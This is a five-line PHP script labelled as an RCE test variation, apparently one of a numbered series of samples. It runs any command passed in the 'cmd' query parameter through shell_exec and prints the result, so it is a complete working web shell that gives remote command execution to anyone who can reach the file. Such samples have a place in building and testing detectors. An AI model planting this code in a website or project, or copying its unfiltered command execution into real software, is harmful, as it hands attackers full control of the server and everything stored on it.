<?php
// RCE test variation #529
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>